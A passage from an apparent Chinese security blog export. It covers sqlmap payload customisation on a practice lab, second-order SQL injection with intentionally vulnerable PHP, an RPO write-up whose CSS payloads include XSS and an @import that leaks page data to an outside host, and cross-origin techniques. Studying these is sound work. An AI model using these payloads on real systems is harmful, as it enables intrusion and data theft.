(dis) #将模块保存到一个dict中，这个dict专门用来保存局部变量的值，key为names[0],即&quot;dis&quot; 2 12 LOAD_NAME 1 (True) #将names[1]，即True压栈。 15 STORE_NAME 2 (myglobal) #将栈顶的元素，即True保存到locals[&apos;myglobal&apos;]中,names[2]即为字符串&apos;myglobal&apos; 4 18 LOAD_CONST 2 (&lt;code object add at 024E3B60, file &quot;test.py&quot;, line 4&gt;) #将consts[2]，即add函数的PyCodeObject压栈。 21 MAKE_FUNCTION 0 #通过add函数的PyCodeObject创建一个函数，并压入栈顶。 24 STORE_NAME 3 (add) #将创建的函数出栈并保存到locals[&apos;add&apos;]中 9 27 LOAD_CONST 3 (&apos;world&apos;) #consts[3],即&quot;world&quot;入栈 30 LOAD_CONST 5 (()) #consts[5],即空数组入栈 33 LOAD_CONST 4 (&lt;code object world at 024E3650, file &quot;test.py&quot;, line 9&gt;) #将consts[4]，即world的PyCodeObject入栈。 36 MAKE_FUNCTION 0 #创建函数 39 CALL_FUNCTION 0 #调用刚创建的函数，用于初始化类，会返回一个dict到栈顶，这个dict中保存了类的方法以及一些全局变量， #具体的实现要看world类的PyCodeObject中的opcode 42 BUILD_CLASS #创建类，注意BUILD_CLASS会用到栈中的三个对象，这里分别为：保存在dict中的类的信息，基类数组，这里为空数组(),类的名称：&quot;world&quot; 43 STORE_NAME 4 (world) #将类保存到locals[&apos;world&apos;]中 15 46 LOAD_NAME 4 (world) 49 CALL_FUNCTION 0 52 STORE_NAME 5 (w) #以上三行代码创建一个world对象 16 55 LOAD_NAME 5 (w) 58 LOAD_ATTR 6 (sayHello) 61 CALL_FUNCTION 0 #以上三行代码调用w.sayHello() 64 POP_TOP 65 LOAD_CONST 1 (None) 68 RETURN_VALUE]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>PyCodeObject</tag>
        <tag>opcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap使用之自定义payload]]></title>
    <url>%2F2017%2F03%2F31%2Fsqlmap%E4%BD%BF%E7%94%A8%E4%B9%8B%E8%87%AA%E5%AE%9A%E4%B9%89payload%2F</url>
    <content type="text"><![CDATA[为什么要自定义payloadsqlmap根据用户提供的level和risk参数决定发送SQL注入测试的payload的种类和数量。通常情况，sqlmap使用默认参数扫描时会存在很多注入扫描不出来的问题，这是因为默认情况下一些注入类型(如order by)是不会去扫描的，虽然用户可以通过提高level参数和risk参数，让sqlmap做更加全面的扫描，但是这种方式会发送大量的请求，影响扫描效率，而且risk参数过高还会带来损害数据库的风险，因此可以通过添加自定义的payload或者修改sqlmap提供的payload，优化扫描策略。 自定义payload可以带来以下好处: 提供针对性的扫描，同时保持sqlmap扫描的高效性(发送的请求少) 针对已知的注入类型，做绕过测试，例如: 结合各种tamper脚本等 添加自定义payload关于sqlmap生成payload的方式可以参见 sqlmap源码解析之test和boundary组合生成payload。 使用 sqli-lab 实验环境，选取lesson 53做测试，核心代码为: 1234$id=$_GET['sort'];if(isset($id))&#123; $sql="SELECT * FROM users ORDER BY '$id'";&#125; 显然, 这是order by类型的注入，而且还是字符型注入。另外看具体代码知道，这题为盲注类型。首先使用sqlmap做默认扫描 123456789101112sqlmap -u &quot;http://sqli.loc/Less-52/?sort=1&quot; -p sort -v 2[14:21:19] [DEBUG] skipping test &apos;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&apos; because the level (4) is higher than the provided (1)sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:---Parameter: sort (GET) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: sort=1&apos; AND SLEEP(5) AND &apos;MAwe&apos;=&apos;MAwe Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])--- 从上面的结果可以看出: 1. 默认level=1的情况下，sqlmap会忽略ORDER BY类型的测试。 2: sqlmap只发了93个请求，识别出了注入点，但是从title可以看出使用的payload并不是ORDER BY类型, 而且还是时间盲注,并不方便后续的数据获取。 提高level参数为4，再次测试 12345678910sqlmap -u &quot;http://sqli.loc/Less-53/?sort=1&quot; -p sort -v 2 --level 4sqlmap identified the following injection point(s) with a total of 417 HTTP(s) requests:---Parameter: sort (GET) Type: boolean-based blind Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause Payload: sort=1&apos; RLIKE (SELECT (CASE WHEN (1428=1428) THEN 1 ELSE 0x28 END))-- dtiw Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))--- sqlmap总共发送了417次请求, 但识别注入点的payload为包含ORDER BY类型的payload. 那么我们可以自定义添加payload或者修改该payload的level值为1，这样批量扫描注入点为这种类型的站点，节约扫描时间。 自定义payload在 xml/payloads/boolean_blind.xml文件后添加test节点如下: 123456789101112131415&lt;test&gt; &lt;title&gt;AND boolean-based blind - WHERE or HAVING or ORDER BY OR GROUP BY clause&lt;/title&gt; &lt;stype&gt;1&lt;/stype&gt; &lt;level&gt;1&lt;/level&gt; &lt;risk&gt;1&lt;/risk&gt; &lt;clause&gt;1,2,3&lt;/clause&gt; &lt;where&gt;1&lt;/where&gt; &lt;vector&gt;AND if([INFERENCE],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))&lt;/vector&gt; &lt;request&gt; &lt;payload&gt;AND if([RANDNUM]=[RANDNUM],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))&lt;/payload&gt; &lt;/request&gt; &lt;response&gt; &lt;comparison&gt;AND if([RANDNUM]=[RANDNUM1],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))&lt;/comparison&gt; &lt;/response&gt;&lt;/test&gt; 识别结果如下，共292次请求，添加的payload成功识别。 123456789101112131415python sqlmap.py -u http://sqli.loc/Less-53/?sort=1 -v 2sqlmap identified the following injection point(s) with a total of 292 HTTP(s) requests:---Parameter: sort (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING or ORDER BY OR GROUP BY clause Payload: sort=1&apos; AND if(9984=9984,9984,(SELECT 9984 FROM INFORMATION_SCHEMA.PLUGINS)) AND &apos;WKRv&apos;=&apos;WKRv Vector: AND if([INFERENCE],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS)) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: sort=1&apos; AND SLEEP(5) AND &apos;rcfl&apos;=&apos;rcfl Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])---]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap源码解析之test和boundary组合生成payload]]></title>
    <url>%2F2017%2F03%2F30%2Fsqlmap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E4%B9%8Btest%E5%92%8Cboundary%E7%BB%84%E5%90%88%E7%94%9F%E6%88%90payload%2F</url>
    <content type="text"><![CDATA[test和boundary组合生成payload这部分主要梳理sqlmap生成payload的方式，sqlmap扫描规则文件位于xml文件夹中的boundaries.xml文件和payloads文件夹，payloads文件夹中存放了六种注入类型的xml文件。 boolean_blind error_based inline_query stacked_queries time_blind union_query 最终payload的生成方式为: prefix + payload + comment + suffix, 其中prefix和suffix由boundaries中的子节点prefix和suffix提供，payload和comment由payloads文件夹中的test的子节点payload和comment提供。 解析testtest节点的格式如下： 1234567891011121314151617181920212223242526&lt;test&gt; &lt;title&gt;&lt;/title&gt; &lt;stype&gt;&lt;/stype&gt; &lt;level&gt;&lt;/level&gt; &lt;risk&gt;&lt;/risk&gt; &lt;clause&gt;&lt;/clause&gt; &lt;where&gt;&lt;/where&gt; &lt;vector&gt;&lt;/vector&gt; &lt;request&gt; &lt;payload&gt;&lt;/payload&gt; &lt;comment&gt;&lt;/comment&gt; &lt;char&gt;&lt;/char&gt; &lt;columns&gt;&lt;/columns&gt; &lt;/request&gt; &lt;response&gt; &lt;comparison&gt;&lt;/comparison&gt; &lt;grep&gt;&lt;/grep&gt; &lt;time&gt;&lt;/time&gt; &lt;union&gt;&lt;/union&gt; &lt;/response&gt; &lt;details&gt; &lt;dbms&gt;&lt;/dbms&gt; &lt;dbms_version&gt;&lt;/dbms_version&gt; &lt;os&gt;&lt;/os&gt; &lt;/details&gt;&lt;/test&gt; title当前测试Payload的标题，通过标题可以了解当前的注入类型以及测试的数据库类型 stypeSQL注入的类型, 可能的值和代表的意义如下 1: Boolean-based blind SQL injection 2: Error-based queries SQL injection 3: Inline queries SQL injection 4: Stacked queries SQL injection 5: Time-based blind SQL injection 6: UNION query SQL injection level测试SQL注入的深度，共有5个级别，级别越高发送的请求数越多。这和boundary子节点level的含义是一致的 1: Always (&lt;100 requests) 2: Try a bit harder (100-200 requests) 3: Good number of requests (200-500 requests) 4: Extensive test (500-1000 requests) 5: You have plenty of time (&gt;1000 requests) risk测试payload破坏数据完整性的可能性。 1: Low risk 2: Medium risk 3: High risk clause[多个值用,分隔]payload在哪个字段位置生效, 这和boundary子节点clause的含义是一致的 0: Always 1: WHERE / HAVING 2: GROUP BY 3: ORDER BY 4: LIMIT 5: OFFSET 6: TOP 7: Table name 8: Column name 9: Pre-WHERE (non-query) where[多个值用,分隔]添加完整payload&lt;prefix&gt; &lt;payload&gt;&lt;comment&gt; &lt;suffix&gt;的地方, 这和boundary子节点where的含义是一致的 1: Append the string to the parameter original value 2: Replace the parameter original value with a negative random integer value and append our string 3: Replace the parameter original value with our string vector注入向量 request注入测试发送的请求 payload 测试使用的payload, 其中的[RANDNUM]，[DELIMITER_STAR]，[DELIMITER_STOP]分别代表着随机数值与字符, 扫描时会用对应的随机数替换掉。 comment 添加在payload后面的注释 char 在union注入测试中暴力破解列数所使用的字符 columns 在union注入测试中测试列的范围， 如&lt;columns&gt;[COLSTART]-[COLSTOP]&lt;/columns&gt; response从响应中识别是否成功注入 comparison(布尔盲注) 应用比较算法，比较两次请求响应的不同，一次请求的payload使用request子节点中的payload, 另一次请求的payload使用response子节点中的comparison grep(报错注入) 响应中匹配的正则表达式 time(时间盲注和堆叠注入) 响应返回之前等待的时间(单位为秒) union(union注入) 调用 unionTest()函数 details注入成功能得到的关于操作系统和数据库相关的信息 dbms 使用的数据库类型 dbms_version 数据库版本 os 运行数据库得操作系统 解析boundariesboundary节点的格式如下: 12345678&lt;boundary&gt; &lt;level&gt;&lt;/level&gt; &lt;clause&gt;&lt;/clause&gt; &lt;where&gt;&lt;/where&gt; &lt;ptype&gt;&lt;/ptype&gt; &lt;prefix&gt;&lt;/prefix&gt; &lt;suffix&gt;&lt;/suffix&gt;&lt;/boundary&gt; 其中level, clause, where表示的含义和test节点中所表示的含义是一致的。 ptype测试参数的类型 1: Unescaped numeric 2: Single quoted string 3: LIKE single quoted string 4: Double quoted string 5: LIKE double quoted string prefix&lt;payload&gt; &lt;comment&gt;添加的前缀 suffix&lt;payload&gt; &lt;comment&gt;添加的后缀 源码解析payload组合sqlmap使用lib/controller/checks.py文件中的checkSqlInjection()函数进行sql注入的测试, 其中利用test和boundary生成payload的主要代码如下，忽略其他逻辑判断 12345678910111213141516171819202122232425262728293031323334353637383940414243# Favoring non-string specific boundaries in case of digit-like parameter valuesif value.isdigit(): kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or "") or _ in (boundary.suffix or "") for _ in ('"', '\''))) boundaries = kb.cache.intBoundarieselse: boundaries = conf.boundariestests = getSortedInjectionTests()while tests: test = tests.pop(0) for boundary in boundaries: injectable = False # Skip boundary if it does not match against test's &lt;clause&gt; # Parse test's &lt;clause&gt; and boundary's &lt;clause&gt; clauseMatch = False for clauseTest in test.clause: if clauseTest in boundary.clause: clauseMatch = True break if test.clause != [0] and boundary.clause != [0] and not clauseMatch: continue # Skip boundary if it does not match against test's &lt;where&gt; # Parse test's &lt;where&gt; and boundary's &lt;where&gt; whereMatch = False for where in test.where: if where in boundary.where: whereMatch = True break if not whereMatch: continue # For each test's &lt;where&gt; for where in test.where: # generage payload templatePayload = agent.payload(..., where=where) 利用test和boundary生成payload的流程为: 循环遍历每一个test, 对某个test,循环遍历boundary 若boundary的where包含test的where值，并且boundary的clause包含test的clause值, 则boundary和test可以匹配 循环test的where值,结合匹配的boundary生成相应的payload]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL注入系列之二次注入(三)]]></title>
    <url>%2F2017%2F03%2F28%2FMySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89%2F</url>
    <content type="text"><![CDATA[二次注入原理二次注入漏洞字面上理解可能就是结合两个注入漏洞点实现sql注入的目的，但是这其中还有几个细节需要讲解一下。首先，第一个注入点因为经过过滤处理所以无法触发sql注入漏洞，比如addslashes函数，将单引号等字符转义变成\’。但是存进数据库后，数据又被还原了，也就是反斜杠没了，在这种情况下，如果能发现一个新的注入同时引用了被插入了的数据库数据，就可以实现闭合新发现的注入漏洞引发漏洞。 演示程序提供用户注册(reg.php)和邮箱搜索(search.php)两个功能，程序在config.php文件中使用addslashes转义所有的GPC输入，然后再将数据插入数据库中，如下图所示，用户输入含有&#39;的用户名会完整的存入数据库。 &#39;被安全的存入了数据库，如果又将该用户名从数据库中取出来，然后再用于数据库查询，若没转义该用户名，则会出现二次注入，演示如下: 搜索邮箱：e@qq.com, 得到mysql报错如下，显然&#39;引发了数据库错误，也就是说这里是可以利用sql注入的。 这里是可以利用盲注，union注入和报错注入的, 当然，注入的利用还和username等字段的长度限制有关。 注册用户名: &#39; union select 1,user(),2,3 #, 邮箱:cc@qq.com, 然后搜索邮箱cc@qq.com, 得到如下结果: 演示代码 config.php 1234567891011121314151617181920212223&lt;?phpmysql_connect('localhost', 'root', 'mysql');mysql_select_db('sqlinject');mysql_set_charset('utf-8');if (!get_magic_quotes_gpc())&#123; if (!empty($_GET))&#123; $_GET = addslashes_deep($_GET); &#125; if (!empty($_POST))&#123; $_POST = addslashes_deep($_POST); &#125; $_COOKIE = addslashes_deep($_COOKIE); $_REQUEST = addslashes_deep($_REQUEST);&#125;function addslashes_deep($value)&#123; if (empty($value))&#123; return $value; &#125;else &#123; return is_array($value) ? array_map('addslashes_deep', $value): addslashes($value); &#125;&#125;?&gt; reg.php 12345678910111213141516171819202122232425&lt;?phpinclude "config.php";if(!empty($_POST['submit']))&#123; $username = $_POST['username']; $password = $_POST['password']; $email = $_POST['email']; $sql = "INSERT INTO `sqlinject`.`users` (`id`, `username`, `password`, `email`) VALUE (NULL, '$username', '$password', '$email');"; $row = mysql_query($sql); if ($row)&#123; echo "注册成功"; &#125; else &#123; echo "注册失败"; &#125;&#125;?&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;&lt;form action="" method="POST"&gt; username&lt;input type="text" name="username"&gt;&lt;br/&gt; password&lt;input type="text" name="password"&gt;&lt;br/&gt; email&lt;input type="text" name="email"&gt;&lt;br/&gt; &lt;input type="submit" name="submit" value="ok"&gt;&lt;/form&gt; search.php 123456789101112131415161718192021222324252627&lt;?phpinclude "config.php";if(!empty($_POST['submit']))&#123; $email = $_POST['email']; $sql = "select * from users where email='&#123;$email&#125;'"; $row = mysql_query($sql); if ($row)&#123; $rows = mysql_fetch_array($row); $username = $rows['username']; $sql = "select * from users where username='$username'"; $row = mysql_query($sql) or die(mysql_error()); if ($row)&#123; $rows = mysql_fetch_array($row); echo $rows['username']."&lt;br/&gt;"; echo $rows['password']."&lt;br/&gt;"; echo $rows['email']."&lt;br/&gt;"; &#125; &#125;&#125;?&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;&lt;form action="" method="POST"&gt; search email&lt;input type="text" name="email"&gt;&lt;br/&gt; &lt;input type="submit" name="submit" value="ok"&gt;&lt;/form&gt;]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>MySQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RPO攻击]]></title>
    <url>%2F2017%2F03%2F27%2FRPO%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[什么是RPORPO(Relative Path Overwrite)相对路径覆盖，是一种利用相对URL路径覆盖目标文件的一种攻击手段。 google案例翻译自http://blog.innerht.ml/rpo-gadgets/. 识别RPORPO依赖于CSS解析器能够解析那些不严谨的语法内容，这是RPO攻击的基础条件，寻找RPO攻击的第一步是检查网页是否按正确的文档类型解析，然后寻找相对CSS样式的导入。 作者发现Google Toolbar的一个目标URL: http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html, 该页面用相对路径导入CSS样式。 1234&lt;html&gt; &lt;head&gt; &lt;title&gt;Google Toolbar API - Guide to Making Custom Buttons&lt;/title&gt; &lt;link href="../../styles.css" rel="stylesheet" type="text/css" /&gt; 下一步是找出目标服务器解析路径的方式。对浏览器来说，目录是通过 / 来分隔的，然而对服务器来说，路径中包含 /并不意味着存在一个目录。例如，JSP接收路径参数是以;作为分隔符的，例如http://example.com/path;/notpath，而浏览器并不识别这种模式，而当做是存在目录的路径。 同样，Google Toolbar也有它自己独特的解析路径的方式。在发送请求给服务器之前，会对请求进行处理并解码所有的路径，但是谷歌浏览器并不会强制转换%2f为/,因此可以将路径中的/替换为%2f。访问http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html 针对上面的链接，服务器和浏览器对路径的解析是不一致的. 服务器视角: /tools/toolbar/buttons/apis/ + howto_guide.html 浏览器视角: /tools/toolbar/buttons/ + apis%2fhowto_guide.html 导入的css样式: /tools/ + toolbar/buttons/../../style.css 以上”+”左边高亮部分表示基本路径，浏览器认为基本路径是 /tools/toolbar/buttons/ 而不是 /tools/toolbar/buttons/apis/, 因此导入相对路径的样式../../style.css 会额外多跳一层目录路径，本应该导入css的路径为”tools/toolbar/style.css”, 而现在为”tools/style.xss”。 除了跳目录以外，还能制作假目录，例如，我们想在导入的样式路径为/tools/fake/styles.css, 可以构造如下url:http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html 服务器视角: /tools/fake/../toolbar/buttons/apis/ + howto_guide.html 浏览器视角: tools/fake/..%2ftoolbar/buttons/ + apis%2fhowto_guide.html 导入的css样式: /tools/fake/..%2ftoolbar/buttons/../../ + style.css 这里我们添加了两个虚假的路径:fake/和..%2f, 以便他们能在服务器相互抵消，同时浏览器认为fake/是一个真实的目录，并且，..%2ftoobar是另外一个目录。理论上，我们可以再根路径上导入任何样式，通过https://www.google.com/*/styles.css, 然而不幸的是代理只在https://www.google.com/tools/*/styles.css路径上有效，换句话说，任何在/tools/路径之外的路径采用编码魔术(%2f代替/)将不起作用, 也就是说，只能在https://www.google.com/tools/*/styles.css.导入任何样式。 我试图四处寻找，发现任何url都是静态的，除了,http://www.google.com/tools/toolbar/buttons/gallery会重定向到http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1。现在事情变得有趣了，参数q是作为搜索参数，并且反应在页面上，让我们注入一个简单的payload:http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a{}*{background:red} 这非常棒，只要我们能通过某种方式导入样式参数q. 最后一步是找出如何在我们引用它作为样式的同时，维持查询字符串。RPO需要持续的注入,因为导入样式表并不包含查询字符串本身。但是由于路径解码的行为，我们能使用如下payload导入样式。 http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html 服务器视角: /tools/toolbar/buttons/gallery?q=%0a{}*{background:red}/..//apis/ + howto_guide.html 浏览器视角: /tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/ + howto_guide.html 导入的css样式: /tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/../../style.css /tools/toolbar/buttons/gallery?q=%0a{}*{background:red}/style.css /gadgets/directory?synd=toolbar&amp;frontpage=1&amp;q=%0a{}*{background:red}/style.css 我们还能做得更好么？当然，我们改变payload为 CSS XSS向量expression(alert(document.domain))，并启动IE8: http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/ 使用RPO加载其他页面我们可以使用RPO去偷其他页面的数据。CSS有一个有意思的地方，在怪异模式下，松散解析适用于所有导入的样式表，只要他们同源，这开辟了一个新的可能，如果导入的样式表包含机密数据和注入点，我们就能通过CSS魔法偷走他们。但这样的页面有最低要求如下： 注入点在机密数据之前出现 注入点允许%0a, %0c 或 %0d，以便于解析器的状态可以从一个错误的状态中恢复过来 机密数据和它周围不能包含换行符 http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D%2540import%2527%252Fsearch%253Fnord%253D1%2526q%253D%257B%257D%25250a%2540import%252527%252F%252Finnerht.ml%253F%2522/..%2f/apis/howto_guide.html RPO 利用原理和条件 相对路径导入css样式 浏览器解析路径和服务器不一致，浏览器将服务器返回的不是css的文件当做CSS文件解析 CSS解析器忽略非法的内容 CSS解析器CSS2 规范中指出，”在某些情况下，用户代理必须忽略非法样式的一部分”，规范定义忽略意味着解析非法部分(为了找到它开始和结束的地方), 同时又当它不存在。规范其他地方又补充到，“对于混合CSS内容和其他内容的文件，CSS会忽略非法的内容”。 那么，我们可以通过植入CSS代码，欺骗CSS解析器去忽略之前的不合法的语法内容，从而加载我们植入的CSS代码，最好的方法是选择一个无效的“选择器”，css会忽略之前所有的非法内容。 如下有两种利用选择器去忽略非法内容的方式，原理是CSS解析器解析}或{}都将工作 12&#125;*&#123;color:#ccc;&#125;&#123;&#125;&#125;*&#123;color:#ccc;&#125; Refer http://edu.aqniu.com/article/65 http://www.thespanner.co.uk/2014/03/21/rpo/ http://blog.innerht.ml/rpo-gadgets/ http://blog.portswigger.net/2015/02/prssi.html]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>RPO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域]]></title>
    <url>%2F2017%2F03%2F26%2F%E8%B7%A8%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[同源策略和跨域浏览器的同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。同源是指：协议相同，域名相同，端口相同。同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。 非同源限制: 无法读取Cookie、LocalStorage 和 IndexDB, 无法获得DOM, 不能发送AJAX 请求。 JSONP(JSON Padding)jsonp在页面上引入不同域上的js脚本文件,利用了script标签的src属性是没有跨域的限制的，从而达到跨域访问的目的。因此它的最基本原理就是：动态添加一个&lt;script&gt;标签来实现。 实现这里是使用ajax来请求的，看起来和ajax没啥区别，其实还是有区别的。ajax的核心是通过XmlHttpRequest获取非本页内容，而jsonp的核心则是动态添加&lt;script&gt;标签来调用服务器提供的js脚本。 123456789$.ajax(&#123; url:&quot;http://crossdomain.com/services.php&quot;, dataType:&apos;jsonp&apos;, data:&apos;&apos;, jsonp:&apos;callback&apos;, success:function(result) &#123; // some code &#125; &#125;); 上面的代码中，callback是必须的，callback是什么值要跟后台拿。获取到的jsonp数据格式如下： 12345flightHandler(&#123; "code": "CA1998", "price": 1780, "tickets": 5&#125;); jsonp的全称为json with padding，上面的数据中，flightHandler就是那个padding. 特性 只能使用get方法，不能使用post方法： script，link, img, iframe等具有src属性的标引入外部资源，都是 get 请求的，那么就决定了 jsonp 一定是 get 的。 CORS策略CORS策略 CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。它为Web服务器定义了一种方式，允许网页从不同的域访问其资源. 实现方法：CORS需要浏览器和服务器同时支持 前端方面 以前我们使用Ajax，代码类似于如下的方式： 1234var xhr = new XMLHttpRequest();// 这里的“/hfahe”是本域的相对路径。xhr.open("GET", "/hfahe", true);xhr.send(); 如果我们要使用CORS，相关Ajax代码可能如下所示： 1234var xhr = new XMLHttpRequest();// 请注意，代码与之前的区别就在于相对路径换成了其他域的绝对路径，也就是要跨域访问的接口地址。xhr.open("GET", "http://blog.csdn.net/hfahe", true);xhr.send(); 服务器方面 服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来进行的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。 特点 CORS支持所有类型的HTTP请求。 document.domain+iframe 使用条件：主域相同 浏览器中不同域的框架之间是不能进行js的交互操作的。但是不同的框架之间（父子或同辈），是能够获取到彼此的window对象的。 比如，有一个页面的地址是 http://www.example.com/a.html ， 在这个页面里面有一个iframe，它的src是 http://example.com/b.html, 很显然，这个页面与它里面的iframe框架是不同域的，所以无法通过在页面中书写js代码来获取iframe中的东西的。这个时候，document.domain就可以派上用场了，只要把 http://www.example.com/a.html 和 http://example.com/b.html 这两个页面的document.domain都设成相同的域名就可以了。 但要注意的是，document.domain的设置是有限制的，我们只能把document.domain设置成自身或更高一级的父域，且主域必须相同。例如：a.b.example.com 中某个文档的document.domain 可以设成a.b.example.com、b.example.com 、example.com中的任意一个，但是不可以设成 c.a.b.example.com,因为这是当前域的子域，也不可以设成baidu.com,因为主域已经不相同了. 实现比如在http://www.example.com/a.html 的页面里要访问 http://example.com/b.html里面的东西。在页面 http://www.example.com/a.html 中设置document.domain: 1234567891011121314151617181920212223//http://www.example.com/a.html&lt;html&gt;&lt;head&gt; &lt;title&gt;A页面&lt;/title&gt; &lt;script type="text/javascript" src="jquery.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;A页面&lt;/div&gt; // 相当于用一个隐藏的iframe来做代理 &lt;iframe id="iframe" src="http://example.com/b.html" style="display:none;"&gt;&lt;/iframe&gt; &lt;script&gt; $(function()&#123; try&#123; document.domain = "example.com"; //这里将document.domain设置成一样 &#125;catch(e)&#123;&#125; $("#iframe").load(function()&#123; var iframe = $("#iframe").contentDocument.$; ifram.get("http://example.com/接口",function(data)&#123;&#125;); &#125;); &#125;); &lt;/script&gt;&lt;body&gt;&lt;/html&gt; 在页面 http://example.com/b.html 中也设置document.domain，而且这也是必须的，虽然这个文档的domain就是example.com,但是还是必须显示的设置document.domain的值： 1234567891011121314151617//http://example.com/b.html&lt;html&gt;&lt;head&gt; &lt;title&gt;B页面&lt;/title&gt; &lt;script type="text/javascript" src="jquery.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;B页面&lt;/div&gt; &lt;script&gt; $(function()&#123; try&#123; document.domain = "example.com"; //这里将document.domain设置成一样 &#125;catch(e)&#123;&#125; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里有个注意点，就是在A页面中，要等iframe标签完成加载B页面之后，再取iframe对象的contentDocument,否则如果B页面没有被iframe完全加载，在A页面中通过contentDocument属性就取不到B页面中的jQuery对象。一旦取到B页面中的jQuery对象，就可以直接发ajax请求了，这种类似“代理”方式可以解决主子域的跨域问题 HTML5 postMessageHTML5 window.postMessage是一个安全的、基于事件的消息API 在需要发送消息的源窗口调用postMessage方法即可发送消息。其中, 源窗口可以是全局的window对象，也可以是以下类型的窗口： 文档窗口中的iframe: 12var iframe = document.getElementById('my-iframe');var win = iframe.documentWindow; JavaScript打开的弹窗： 1var win = window.open(); 当前文档窗口的父窗口： 1var win = window.parent; window.opener 1var win = window.opener(); 发送消息：找到源window对象后，即可调用postMessage API向目标窗口发送消息： 1win.postMessage(msg, targetOrigin); 接收消息：那目标窗口要怎么接收传过来的数据呢，只要监听window的message事件就可以接收了。 1234567891011var onmessage = function (event) &#123; var data = event.data; var origin = event.origin; //do someing&#125;;if (typeof window.addEventListener != &apos;undefined&apos;) &#123; window.addEventListener(&apos;message&apos;, onmessage, false);&#125; else if (typeof window.attachEvent != &apos;undefined&apos;) &#123; //for ie window.attachEvent(&apos;onmessage&apos;, onmessage);&#125; 实现 http://test.com/index.html —&gt; 发送消息的页面 1234567891011&lt;!-- 这个是 http://test.com/index.html 页面 --&gt; &lt;div&gt; &lt;!-- 要给下面的页面传一个妹子过去 --&gt; &lt;iframe id="child" src="http://lsLib.com/lsLib.html"&gt;&lt;/iframe&gt; &lt;/div&gt;&lt;script type="text/javascript"&gt; window.onload=function()&#123; window.frames[0].postMessage('xxx','http://lslib.com'); &#125;&lt;/script&gt; http://lslib.com/lslib.html —&gt; 接收消息的页面 1234567&lt;!-- 这个是 http://lslib.com/lslib.html 页面 --&gt;&lt;script type=&quot;text/javascript&quot;&gt; window.addEventListener(&apos;message&apos;,function(e) &#123; console.log(e.origin,e.data); alert(&apos;收到妹子一枚：&apos;+e.data); &#125;);&lt;/script&gt; window.name原理：当iframe的页面跳到其他地址时，其window.name值保持不变，并且可以支持非常长的 name 值（2MB）。 浏览器跨域iframe禁止互相调用/传值.但是调用iframe时 window.name 却不变,正是利用这个特性来互相传值,当然跨域下是不容许读取ifram的window.name值.所以这里我们还要准备一个和主页面http://www.a.com/main.html 相同域下的代理页面http://www.a.com/other.html ,iframe调用子页面http://www.b.com/data.html 实现 准备三个页面： http://www.a.com/main.html //应用页面 http://www.a.com/other.html // 代理页面，要求和应用页面在同一个域。一般是一个空的html http://www.b.com/data.html //应用页面获取数据的页面，简称：数据页面 数据页面将数据传到window.name中去。 http://www.b.com/data.html中的 data.html 12// 